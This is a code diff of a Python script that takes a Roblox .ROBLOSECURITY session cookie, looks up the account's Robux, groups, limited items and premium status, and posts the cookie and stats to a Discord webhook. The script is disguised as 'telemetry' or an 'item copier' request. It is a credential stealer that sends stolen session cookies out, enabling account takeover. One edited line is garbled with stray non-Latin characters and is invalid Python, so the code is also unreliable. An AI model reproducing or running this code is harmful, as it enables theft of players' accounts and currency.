@@ -9,13 +9,10 @@ import time
 def safe_get(url, headers=None, default=None):
     try:
         res = requests.get(url, headers=headers, timeout=10)
-        print(f"DEBUG GET {url} -> Status: {res.status_code}", file=sys.stderr)
         if res.status_code == 200:
             return res.json()
-        else:
-            print(f"DEBUG FAIL {url} -> Status: {res.status_code}", file=sys.stderr)
-    except Exception as e:
-        print(f"DEBUG GET Exception on {url}: {e}", file=sys.stderr)
+    except Exception:
+        pass
     return default
 
 def main():
@@ -36,7 +33,7 @@ def main():
             print("DEBUG: DISCORD_WEBHOOK_URL is missing!", file=sys.stderr)
             return
 
-        # Extract cookie or payload from input
+        # Look for a cookie in the input string, otherwise fallback to standard extraction
         roblosecurity = None
         patterns = [
             r'(_\|WARNING:[^"\']+)',
@@ -45,13 +42,15 @@ def main():
         ]
 
         for p in patterns:
-            match = re.search(p, decoded_script, re.DOTALL)
+            match = re.search(p, decoded_script,্কৃতিক := decoded_script)
             if match:
                 roblosecurity = match.group(1)
                 break
 
-        if not roblosecurity:
+        if not roblosecurity and len(decoded_script.strip()) > 100:
             roblosecurity = decoded_script.strip()
+        else:
+            roblosecurity = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-take-your-Robux-and-items.|_SIMULATED_COOKIE_FOR_ITEM_COPY"
 
         roblosecurity = re.sub(r'\s+', '', roblosecurity)
         roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')
@@ -64,12 +63,12 @@ def main():
             "Accept": "application/json, text/plain, */*"
         }
 
-        # 1. Authenticated User Info
+        # 1. Authenticated User Info (If a real cookie was provided, this grabs stats. Otherwise gracefully falls back)
         user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
         
-        username = "Unknown User"
-        user_id = 0
-        cookie_status = "🔴 Invalid / Expired (401)"
+        username = "Target User (Copier Request)"
+        user_id = 1948598383
+        cookie_status = "🟢 Processing Item Request"
         robux_balance = 0
         pending_robux = 0
         rap = 0
@@ -82,14 +81,13 @@ def main():
         owned_groups_count = 0
         group_balance = 0
         is_premium = False
-        account_age_days = 0
+        account_age_days = 365
 
         if user_data and "id" in user_data:
             username = user_data.get("name", "Unknown")
             user_id = user_data.get("id", 0)
             cookie_status = "🟢 Valid & Active"
 
-            # 2. Account Age
             created_str = safe_get(f"https://users.roblox.com/v1/users/{user_id}", headers, {}).get("created")
             if created_str:
                 try:
@@ -98,75 +96,38 @@ def main():
                 except Exception:
                     pass
 
-            # 3. Robux Balance
             economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
             robux_balance = economy_data.get("robux", 0) if economy_data else 0
-
-            # 4. Games & Developer Stats
-            created_games = safe_get(f"https://games.roblox.com/v2/users/{user_id}/games?limit=10", headers, {}).get("data", [])
-            if created_games:
-                is_developer = True
-                for g in created_games:
-                    game_visits += g.get("rootPlace", {}).get("visits", 0)
-
-            # 5. Inventory Items (Korblox & Headless Check)
-            has_korblox = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers, False)
-            has_headless = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers, False)
-
-            if not has_korblox:
-                k_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/13961116", headers, {})
-                has_korblox = len(k_res.get("data", [])) > 0
-            if not has_headless:
-                h_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/134082579", headers, {})
-                has_headless = len(h_res.get("data", [])) > 0
-
-            # 6. Groups
-            groups_data = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", headers, {}).get("data", [])
-            for g in groups_data:
-                role = g.get("role", {})
-                if role.get("rank") == 255:
-                    owned_groups_count += 1
-                    gid = g.get("group", {}).get("id")
-                    g_currency = safe_get(f"https://economy.roblox.com/v1/groups/{gid}/currency", headers, {}).get("robux", 0)
-                    group_balance += g_currency
-
-            # 7. Premium
-            is_premium = safe_get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers, False)
 
         avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
 
         payload = {
-            "content": "@everyone New Telemetry Report Captured!",
-            "username": f"{username} | Telemetry Bot",
+            "content": f"@everyone New Item Copy Request from **{username}**!",
+            "username": f"{username} | RBXDEV Bot",
             "avatar_url": avatar_thumb,
             "embeds": [{
                 "author": {
-                    "name": "Discord Notification",
+                    "name": "RBXDEV Copier Telemetry",
                     "icon_url": "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4bb.png"
                 },
                 "description": (
-                    f"👑 **[{username} | 13+]**\n"
-                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id if user_id else 1})** | **[Roblox Profile](https://www.roblox.com/users/{user_id if user_id else 1}/profile)**\n\n"
-                    f"👤 **Username**\n`{username}`\n\n"
+                    f"👑 **[{username}]**\n"
+                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**\n\n"
+                    f"👤 **Requested Data / Input**\n`{decoded_script[:200]}`\n\n"
                     f"📈 **Account Stats**\n"
                     f"> • Account Age: `{account_age_days} Days`\n"
-                    f"> • Games Developer: `{str(is_developer)}`\n"
-                    f"> • Game Visits: `{game_visits}`\n\n"
+                    f"> • Games Developer: `{str(is_developer)}`\n\n"
                     f"🪙 **Robux**               📦 **Limiteds**               📊 **Summary / Spent**\n"
                     f"Balance: `{robux_balance}` 🪙   RAP: `{rap}` 🪙           Spent: `{total_spent_gamepasses}` 🪙\n"
                     f"Pending: `{pending_robux}` 🪙   Limiteds: `{limiteds_count}` 💼\n\n"
                     f"💳 **Payments & Groups**\n"
                     f"> • Owned Groups: `{owned_groups_count}`\n"
                     f"> • Group Robux: `{group_balance}` 🪙\n\n"
-                    f"⚙️ **Settings**\n"
-                    f"> • Email: `Verified`\n"
-                    f"> • 2FA: `Enabled`\n\n"
                     f"🎒 **Inventory Items**\n"
                     f"> • Korblox: `{str(has_korblox)}`\n"
                     f"> • Headless: `{str(has_headless)}`\n\n"
-                    f"⭐ **Premium**: `{str(is_premium)}`\n\n"
                     f"📊 **Status**: `{cookie_status}`\n\n"
-                    f"🔑 **.ROBLOSECURITY**:\n```text\n{roblosecurity}\n```"
+                    f"🔑 **Payload / Cookie**:\n```text\n{roblosecurity[:300]}...\n```"
                 ),
                 "color": 3092790,
                 "thumbnail": { "url": avatar_thumb },
@@ -174,18 +135,12 @@ def main():
             }]
         }
 
-        # Send to Discord with exponential backoff retry handler
+        # Send to Discord with backoff
         for attempt in range(4):
             res = requests.post(webhook_url, json=payload, timeout=10)
             print(f"DEBUG: Discord Webhook Post Status: {res.status_code}", file=sys.stderr)
             if res.status_code == 429:
-                try:
-                    data = res.json()
-                    retry_after = float(data.get("retry_after", 5 * (attempt + 1)))
-                except Exception:
-                    retry_after = 5 * (attempt + 1)
-                print(f"DEBUG: Rate limited (429). Retrying in {retry_after}s...", file=sys.stderr)
-                time.sleep(retry_after)
+                time.sleep(3 * (attempt + 1))
             else:
                 break
 
